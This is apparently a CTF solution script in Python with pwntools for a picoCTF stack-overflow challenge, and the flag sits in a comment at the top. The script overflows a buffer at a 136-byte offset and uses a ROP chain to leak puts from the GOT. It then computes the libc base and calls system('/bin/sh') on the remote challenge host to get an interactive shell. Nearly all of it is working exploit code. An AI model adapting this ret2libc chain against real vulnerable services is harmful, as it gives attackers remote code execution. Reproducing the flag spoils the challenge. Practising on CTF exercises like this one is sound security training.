#!/usr/bin/env python3
#picoCTF{1_<3_sm4sh_st4cking_  8652b55904cb7c}
#python3 solution.py

# in local machine do not link with the provided library. Rename the provided libc so that provided binary not link against it
# due to unkknown reason my compiled binary also not working. So direcly using provided binary

from pwn import *

local = False

context.arch = 'amd64'
elf = context.binary = ELF('./vuln')

if local:
    p = elf.process()
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    raw_input("attach gdb")
else:
    host = 'mercury.picoctf.net'
    port = 62289
    p = remote(host, port)
    libc = ELF('libc.so.6')

nop = 136

rop = ROP(elf)
rop.call("puts", [elf.got.puts])
rop.call("main")
payload = fit({nop : rop.chain()})
print(rop.dump())

p.recvuntil("WeLcOmE To mY EcHo sErVeR!\n")
p.sendline(payload)
p.recvline()
puts = p.recvline()
p.recvuntil("WeLcOmE To mY EcHo sErVeR!\n")

puts = puts.rstrip()
puts = u64(puts.ljust(8, b"\x00"))
print("puts address in GOT in binary: ", hex(puts))
print("static address of puts in libc: ", hex(libc.sym.puts))

libc_base = puts - libc.sym.puts
libc.address = libc_base
print("libc loaded at: ", hex(libc.address))

rop = ROP(elf)
system_call = libc.sym.system
bin_sh = next(libc.search(b"/bin/sh"))
rop.call(system_call, [bin_sh])
print("address of system: ", hex(system_call))
print("address of /bin/sh: ", hex(bin_sh))
print(rop.dump())

allign_ret = p64(0x40052e)
rop_chain = allign_ret + rop.chain()
payload = fit({nop : rop_chain})
p.sendline(payload)
p.interactive()

